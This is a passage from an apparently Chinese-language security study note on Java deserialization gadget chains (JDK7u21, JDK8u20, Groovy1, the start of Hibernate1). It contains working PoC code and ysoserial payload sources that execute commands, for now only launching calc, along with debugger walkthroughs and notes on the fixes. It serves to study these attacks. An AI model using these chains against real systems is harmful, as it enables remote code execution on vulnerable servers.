var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
```

- 当memberValue中只有一个key时，为`127*key.hashCode()^value.hashCode`。
- 当`key.hashCode()` 等于 0 时，任何数异或0的结果仍是它本身，就变为 `value.hashCode()`
- 当 value 就是 TemplatesImpl 对象时，这两个哈希就变成完全相等。

所以，找到一个hashCode是0的对象作为`memberValues`的key，将恶意TemplatesImpl对象作为value，这个proxy计算的hashCode就与TemplatesImpl对象本身的hashCode相等。

```
public static void bruteHashCode(){
    for (long i=0;i<9999999999L;i++){
        if (Long.toHexString(i).hashCode()==0){
            System.out.println(Long.toHexString(i));
        }
    }
}
```

跑出`f5a5a608`，也是 ysoserial中用到的字符串。

## 利用链梳理

- 生成恶意`TemplatesImpl`对象
- 实例化`AnnotationInvocationHandler`对象
  - type属性是一个TemplatesImpl类
  - memberValues属性是一个Map，Map只有一个key和value，key是字符串`f5a5a608`，value是前面生成的恶意TemplatesImpl对象。
- 对这个`AnnotationInvocationHandler`做一层代理，生成proxy对象。
- 实例化一个HashSet，两元素，
  - TemplatesImpl对象
  - proxy对象
- 将HashSet序列化

反序列化触发代码执行流程：

- 触发HashSet的readObject方法，使用HashMap的key去重。
- 去重时计算HashSet中的两个元素的`HashCode()`，因为此时二者相等，所以触发`equals`方法。
- 调用`AnnotationInvocationHandler#equalsImpl`方法。
- `equalsImpl`中遍历`this.type`的每个方法并调用
- 触发`TemplatesImpl#newTransform()`或`TempltesImpl#getOutputProperties()`方法
- 任意代码执行

## poc

```
package jdk7u21;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;


import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("jdk7u21");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(obj);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, obj);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## 调试

在`HashSet#readObject`处下断点，

![image-20220202162505178](img/image-20220202162505178.png)![image-20220202162505178](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202162505178.png?lastModify=1646033842)

新建一个`LinkedHashMap`，读取poc的HashSet存有2个元素。

循环放入新建的`LinkedHashMap` (为了去重)。

首先读取出来`TemplatesImpl`对象做为key放进map的put方法，跟进

![image-20220202162944791](img/image-20220202162944791.png)![image-20220202162944791](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202162944791.png?lastModify=1646033842)

`LinkedHashMap`本身没有 put 方法，所以进入到父类`HashMap`的 put 方法。

这里计算其hash，跟进

![image-20220202163044157](img/image-20220202163044157.png)![image-20220202163044157](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202163044157.png?lastModify=1646033842)

`k.hashCode()`，k为poc中的TemplatesImpl对象，所以即为`TemplatesImpl.hashCode`。然后进行固定的计算。

indexFor也为固定的

```
static int indexFor(int h, int length) {
    return h & (length-1);
}
```

`indexFor(hash, table.length);` ，table的来历：

```
new LinkedHashMap<E,Object>(capacity, loadFactor) : -->
super(initialCapacity, loadFactor); -->
able = new Entry[capacity];
```

![image-20220202164041885](img/image-20220202164041885.png)![image-20220202164041885](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202164041885.png?lastModify=1646033842)

table[i] 并没有往里放东西，所以for循环条件不满足，跳过，

接下来跟进`addEntry` ，

![image-20220202164239251](img/image-20220202164239251.png)![image-20220202164239251](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202164239251.png?lastModify=1646033842)

调用父类`HashMap`的`addEntry`

![image-20220202164341508](img/image-20220202164341508.png)![image-20220202164341508](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202164341508.png?lastModify=1646033842)

接着跟进`createEntry`

![image-20220202164558587](img/image-20220202164558587.png)![image-20220202164558587](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202164558587.png?lastModify=1646033842)

对之前的table[8]进行赋值。

回到`put`方法，然后回到`HashSet#readObject`

![image-20220202164851636](img/image-20220202164851636.png)![image-20220202164851636](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202164851636.png?lastModify=1646033842)

进行第二次的`put`操作，此时参数1为poc中的代理对象

```
Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
```

跟进后，再次计算`hash`，

![image-20220202165143868](img/image-20220202165143868.png)![image-20220202165143868](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202165143868.png?lastModify=1646033842)

跟进，

![image-20220202165217143](img/image-20220202165217143.png)![image-20220202165217143](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202165217143.png?lastModify=1646033842)

此时的`k.hashCode`是`Proxy#hashCode`,进入了代理类的`invoke`方法，

![image-20220202165352510](img/image-20220202165352510.png)![image-20220202165352510](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202165352510.png?lastModify=1646033842)

调用到`hashCodeImpl`方法，

![image-20220202170317533](img/image-20220202170317533.png)![image-20220202170317533](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202170317533.png?lastModify=1646033842)

for，循环调用一次后，计算var1，此时var3为HashMap对象中的第一个元素，`map.put(zeroHashCodeStr, obj);`

![image-20220202170507565](img/image-20220202170507565.png)![image-20220202170507565](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202170507565.png?lastModify=1646033842)

![image-20220202170616499](img/image-20220202170616499.png)![image-20220202170616499](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202170616499.png?lastModify=1646033842)

经过计算，其hashCode为 0(这个字符串是我们精心设计的，所以肯定为0)，

obj为`TemplatesImpl`对象

![image-20220202170913771](img/image-20220202170913771.png)![image-20220202170913771](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202170913771.png?lastModify=1646033842)

![image-20220202170958460](img/image-20220202170958460.png)![image-20220202170958460](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202170958460.png?lastModify=1646033842)

所以这里proxy的hash和TemplatesImpl的hashCode是一样的。

由于之前的`table[8]=e`，导致这里的for循环条件`table[i]!=null`成立，进入for循环

![image-20220202173113212](img/image-20220202173113212.png)![image-20220202173113212](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202173113212.png?lastModify=1646033842)

if判断中调用`key.equals`，成功调用了代理类的 invoke 方法

![image-20220202171842883](img/image-20220202171842883.png)![image-20220202171842883](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202171842883.png?lastModify=1646033842)

满足条件进入`equalsImpl`，参数为`TemplatesImpl`对象

![image-20220202172201262](img/image-20220202172201262.png)![image-20220202172201262](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202172201262.png?lastModify=1646033842)

调用到反射动态执行方法，`TemplatesImpl#getOutputProperties`，

![image-20220202172301528](img/image-20220202172301528.png)![image-20220202172301528](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202172301528.png?lastModify=1646033842)

弹出计算器，成功。

## 修复

java的版本是多个分支同时开发的，并不意味着JDK7的东西都比JDK6新。所以，并不能认为适用于JDK7的链一定适用于JDK6，

JDK6u45修复了这条链，

JDK8发布时，JDK7已经修复了这个问题，所以JDK8全版本都不受影响。

![image-20220202174222966](img/image-20220202174222966.png)![image-20220202174222966](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202174222966.png?lastModify=1646033842)

![image-20220202174245809](img/image-20220202174245809.png)![image-20220202174245809](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202174245809.png?lastModify=1646033842)

## 思考

回过头来，poc中设置`AnnotationInvocationHAndler`中type的参数，是由于这里，

![image-20220202174717627](img/image-20220202174717627.png)![image-20220202174717627](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202174717627.png?lastModify=1646033842)

type不能和本身相等，但需要和传进来的参数类型相等。传进来的参数为`TemplatesImpl`对象。所以想用反射调用`TemplatesImpl`方法达到代码执行必须type为`Templates.class`。

而官方修复是时对type进行检查抛出异常，所以也就修复了此链。

## ysoserial:

```
package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/*

Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/frohoff/24af7913611f8406eaf3

Call tree:

LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies()
@Authors({ Authors.FROHOFF })
public class Jdk7u21 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates); // swap in real object

		return set;
	}

	public static boolean isApplicableJavaVersion() {
	    JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jdk7u21.class, args);
	}

}
```

Java安全漫谈 - 18.原生反序列化利用链.pdf

# JDK8u20原生链

在JDK7u21修复方法中，对`AnnotationInvocationHandler#readOnject`中对`this.type`进行检查抛出了异常。

![image-20220202174222966](img/image-20220202174222966.png)![image-20220202174222966](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220202174222966.png?lastModify=1646033842)

```
private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();
    // Check to make sure that types have not evolved incompatibly
    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
            }
        }
    }
}
```

> 在`AnnotationInvocationHandler`类中，其重写了`readObejct`方法，那么根据 oracle 官方定义的 Java 中可序列化对象流的原则——如果一个类中定义了`readObject`方法，那么这个方法将会取代默认序列化机制中的方法读取对象的状态，**可选的信息**可依靠这些方法读取，而**必选数据部分**要依赖`defaultReadObject`方法读取；

在第一行调用了`defaultReadObject()`方法，该方法主要用来从字节流中读取对象的字段值，它可以从字节流中按照定义对象的类描述符以及定义的顺序读取字段的名称和类型信息。这些值会通过匹配当前类的字段名称来赋予，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，如果这个值出现在字节流中，但是并不属于对象，则抛弃该值。

在利用`defaultReadObject()`还原了一部分对象的值后，然后进行`AnnotationType.getInstance(type)`判断，如果传入的type不是`AnnotationType`类型，那么抛出异常。

也就是说，在jdk7u21利用链中，传入的`AnnotationInvocationHandler`对象在异常被抛出前，已经从序列化数据中被还原出来，只要跳过这个异常，那么就重新可以达到代码执行的目的。

`jdk8u20`原理即为： **逃出异常抛出。**

## 基础知识

## try...catch...嵌套

通常为了程序出现某些错误后能够继续执行，可以利用捕获异常并处理的方式使程序继续执行。

```
try{
    ...
}catch(Exception e){
    ...
}
```

测试Demo1.java

```
package jdk8u20;

public class Demo1 {
    public void test1(){
        try{
            int a = 1/0;
        }catch (Exception e){
            System.out.println("test1 出现异常");
            throw e;
        }
        System.out.println("test1  end");
    }
    public void test2(){
        try{
            test1();
        }catch (Exception e){
            System.out.println("test2 出现异常");
            System.out.println(e);
        }
        System.out.println("test2 end");
    }

    public static void main(String[] args) {
        new Demo1().test2();
        System.out.println("main end");
    }
}
```

输出：

```
test1 出现异常
test2 出现异常
java.lang.ArithmeticException: / by zero
test2 end
main end
```

在test1方法里抛出异常后，不能往下继续执行到`test1`方法里的后续内容，在调用`test1`方法的`test2`方法里捕获到其异常，但是并没有进行抛出，进行输出操作，这样test2中的后续内容继续可以执行。main函数也可继续执行。

Deme2.java

```
package jdk8u20;

public class Demo2 {
    public void test1() throws Exception {
        try{
            int a = 1/0;
        }catch (Exception e){
            System.out.println("test1 出现异常");
            throw new Exception(e);
        }
        System.out.println("test1  end");
    }
    public void test2() throws Exception {
        try{
            test1();
        }catch (Exception e){
            System.out.println("test2 出现异常");
            throw new Exception(e);
        }
        System.out.println("test2 end");
    }

    public static void main(String[] args) throws Exception {
        new Demo1().test1();
        System.out.println("main end");
    }
}
```

输出

```
test1 出现异常
Exception in thread "main" java.lang.Exception: java.lang.ArithmeticException: / by zero
...
```

直接调用`test1`方法在直接抛出异常，导致进程结束。

那么我们就可以用`try..catch...`嵌套的方法使得进程继续执行。

## java 序列化

可使用[serializationDumper](https://github.com/NickstaDB/SerializationDumper/releases/tag/1.13) 查看结构内容

## JDK8U20

> 在`AnnotationType.getInstance`方法里对this.type类型有判断,需要是annotation类型,原payload里面是`Templates`类型,所以这里会抛出错误。可以看到在readObject方法里面,是先执行`var1.defaultReadObject()`还原了对象,然后在进行验证,不符合类型则抛出异常。漏洞作者找到`java.beans.beancontext.BeanContextSupport`类对这里进行了绕过。

```
BeanContextSupport#readObject
private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {

    synchronized(BeanContext.globalHierarchyLock) {
        ois.defaultReadObject();

        initialize();

        bcsPreDeserializationHook(ois);

        if (serializable > 0 && this.equals(getBeanContextPeer()))
            readChildren(ois);

        deserialize(ois, bcmListeners = new ArrayList(1));
    }
}
BeanContextSupport#readChildren
public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    int count = serializable;

    while (count-- > 0) {
        Object child = ois.readObject();
        BCSChild bscc = (BCSChild) ois.readObject();

        synchronized(child) {
            BeanContextChild bcc = null;

            try {
                bcc = (BeanContextChild)child;
            } catch (ClassCastException cce) {
                // do nothing;
            }

            if (bcc != null) {
                try {
                    bcc.setBeanContext(getBeanContextPeer());

                    bcc.addPropertyChangeListener("beanContext", childPCL);
                    bcc.addVetoableChangeListener("beanContext", childVCL);

                } catch (PropertyVetoException pve) {
                    continue;
                }
            }

            childDeserializedHook(child, bscc);
        }
    }
}
```

在`readChildren`方法中，在执行`ois.readObject()`时，进行了try catch，但是没有抛出异常。如果这里把`AnnotationInvocationHandler`对象在`BeanContextSupport`类第二次writeObject的时候写入`AnnotationInvocationHandler`对象，这样反序列化时，即使`AnnotationInvocationHandler`抛出异常程序也不会终止。

反序列化还有两点就是:

1. 反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是会抛弃掉这个成员。
2. 每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用`TC_REFERENCE`结构,引用前面handle的值。





















https://xz.aliyun.com/t/9765

https://xz.aliyun.com/t/8277#toc-5

https://tttang.com/archive/1357/

https://paper.seebug.org/1232/  -  java序列化过程

# CC链总结

https://mp.weixin.qq.com/s/oEtgJHWXB5lEJinWDOtKcw

https://sec.lz520520.com/2021/07/612/#i

# Groovy1

Groovy是一种基于JVM的开发语言，具有类似于Python、Ruby、Perl和Smalltalk的功能。Groovy既可以用作Java平台的编程语言，也可以用作脚本语言。Groovy编译之后生成 .class 文件，与Jaba编译生成的无异，因此可以在JVM上运行。

在项目中可以引用 Groovy 的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用 groovy-all。本条利用 Gadget 就是在 groovy 核心包中。

**版本 `Groovy 1.7.0-2.4.3`**

依赖

```
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy</artifactId>
    <version>2.3.9</version>
</dependency>
```

## 前置知识

#### MethodClosure

`org.codehaus.groovy.runtime.MethodClosure`是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。

构造函数，

参数1： 对象

参数2： 方法名

```
public MethodClosure(Object owner, String method) {
    super(owner);
    this.method = method;
    Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();
    this.maximumNumberOfParameters = 0;
    this.parameterTypes = new Class[0];
    List<MetaMethod> methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);
    Iterator i$ = methods.iterator();

    while(i$.hasNext()) {
        MetaMethod m = (MetaMethod)i$.next();
        if (m.getParameterTypes().length > this.maximumNumberOfParameters) {
            Class[] pt = m.getNativeParameterTypes();
            this.maximumNumberOfParameters = pt.length;
            this.parameterTypes = pt;
        }
    }

}
```

doCall 方法，调用了`InvokerHelper.invokeMethod()`方法进行方法调用。

```
protected Object doCall(Object arguments) {
    return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);
}
```

这样就可以使用`MethodClosure`执行命令：

```
package grovvy;

import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Demo1 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        MethodClosure mc = new MethodClosure(Runtime.getRuntime(), "exec");
        Method doCall = MethodClosure.class.getDeclaredMethod("doCall", Object.class);
        doCall.setAccessible(true);
        doCall.invoke(mc,"calc");
    }
}
```

#### String.execute() 方法

Grooy为String类型添加了`execute`方法，已便执行shell命令，

```
ProcessGroovyMethods
public static Process execute(String self) throws IOException {
    return Runtime.getRuntime().exec(self);
}
```

Demo2.grovvy

```
package grovvy

class Demo2 {
    static void main(String[] args) {
        println("whoami".execute().text)
    }
}
```

相当于java

```
package grovvy;

import org.codehaus.groovy.runtime.MethodClosure;

public class Demo3 {
    public static void main(String[] args) {
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        methodClosure.call();

    }
}
```

#### ConvertedClosure

`org.codehaus.groovy.runtime.ConvertedClosure` 是一个通用适配器，用于将闭包适配到java接口。`ConvertedClosure`扩展了`ConversionHandler`类，`ConversionHandler`又实现了`InvocationHandler`接口，所以说 ConvertedClosure本身就是一个动态代理类。

`ConvertedClosure`的构造方法接收一个Closure对象和一个String类型的 method 方法名。

```
package org.codehaus.groovy.runtime;

import groovy.lang.Closure;
import java.io.Serializable;
import java.lang.reflect.Method;

public class ConvertedClosure extends ConversionHandler implements Serializable {
    private String methodName;
    private static final long serialVersionUID = 1162833713450835227L;

    public ConvertedClosure(Closure closure, String method) {
        super(closure);
        this.methodName = method;
    }

    public ConvertedClosure(Closure closure) {
        this(closure, (String)null);
    }

    public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable {
        return this.methodName != null && !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);
    }
}
```

ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 `invoke` 方法，除了 toString 和一些默认方法外，会调用 `invokeCustom` 方法。

如果初始化时指定的method与 `invokeCustom` 指定的 method 参数相同，则 `invokeCustom` 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。

> 看到这里就明白这条链的触发逻辑了。后面自然是使用 AnnotationInvocationHandler 将 ConvertedClosure 代理成 Map 类。这样在反序列化

## POC

```
package grovvy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class Groovy {
    public static void main(String[] args) throws Exception {
        // 封装成我们需要执行的对象
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建 ConvertedClosure 的动态代理实例
        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(invocationHandler);
        out.close();

        ObjectInputStream in  = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        in.readObject();
        in.close();
    }
}
```

## 调试

在`AnnotationInvocationHandler#readObject`下断点

![image-20220207193309504](img/image-20220207193309504.png)![image-20220207193309504](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207193309504.png?lastModify=1646033842)

```
Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure);
```

利用`AnnotationInvocationHandler` 来指定Proxy的方法，使得其执行到 `ConvertedClosure#invoke` 方法

![image-20220207193504504](img/image-20220207193504504.png)![image-20220207193504504](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207193504504.png?lastModify=1646033842)

满足条件后进入`invokeCustom`

![image-20220207193648134](img/image-20220207193648134.png)![image-20220207193648134](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207193648134.png?lastModify=1646033842)

此时`this.methodName`为poc中构造函数传进来的`entrySet`,`method`为 我们触发invoke时的方法名entrySet，判断条件，进入`((Closure)this.getDelegate()).call(args)`

```
this.getDelegate()` 为传进来的`methodClosure
MethodClosure methodClosure = new MethodClosure("calc", "execute");
ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");
```

跟进

![image-20220207194055422](img/image-20220207194055422.png)![image-20220207194055422](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207194055422.png?lastModify=1646033842)

最终触发Groovy中String类型的execute方法

![image-20220207194931655](img/image-20220207194931655.png)![image-20220207194931655](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207194931655.png?lastModify=1646033842)

## ysoserial

```
package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				Comparator.compare() (Proxy)
					ConvertedClosure.invoke()
						MethodClosure.call()
							...
						  		Method.invoke()
									Runtime.exec()

	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({ Authors.FROHOFF })
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

		final Map map = Gadgets.createProxy(closure, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Groovy1.class, args);
	}
}
```

## 总结

- 利用`AnnotationInvocationHandler`反序列化时调用`memberValues#entrySet()`，成功调用代理的`invoke`又去调用`MethodClosure#call`，触发Groovy中String类型的execute方法

- 调用链

  ```
  AnnotationInvocationHandler#readObject --->
  Map.entrySet (Proxy)--->
  ConvertedClosure#invoke --->
  MethodClosure#call --->
  String#execute ---   ProcessGroovyMethods.execute
  ```

# Hibernate1

**Hibernate : 3-5**

Hibernate 是开源的一个 ORM 框架，用户量极其庞大，Hibernate1 依旧是利用 TemplatesImpl 这个类，找寻 `_outputProperties` 的 getter 方法的调用链。

## 前置知识

#### BasicPropertyAccessor

```
org.hibernate.property.BasicPropertyAccessor
public class BasicPropertyAccessor implements PropertyAccessor
```

先看看其接口

![image-20220207201613333](img/image-20220207201613333.png)![image-20220207201613333](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220207201613333.png?lastModify=1646033842)

定义了获取一个类的属性值的相关策略，有两个方法。接收Class对象和属性名，返回`Getter`和`Setter`对象。

在实现类`BasicPropertyAccessor`中，定义了`BasicGetter`和`BasicSetter`两个实现类，

看下`BasicGetter`类，

![image-20220208102610213](img/image-20220208102610213.png)![image-20220208102610213](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208102610213.png?lastModify=1646033842)

构造函数接收三个参数，分别是Class对象，Method方法，

![image-20220208102804616](img/image-20220208102804616.png)![image-20220208102804616](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208102804616.png?lastModify=1646033842)

propertyName属性名。BasicGetter的`get`方法接收一个Object对象实例，并调用`method.invoke()`方法反射调用构造函数传入的Method方法。

接下来回到 BasicPropertyAccessor，类的`getGetter`方法调用`createGetter()`，又调用`getGetterOrNull`来创建BasicGetter。

![image-20220208103155770](img/image-20220208103155770.png)![image-20220208103155770](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220208103155770.png?lastModify=1646033842)

在`getGetterOrNull`中调用了`getterMethod`方法，这个方法通过指定的Class类以及propertyName属性名来查找这个属性的 Getter 方法。

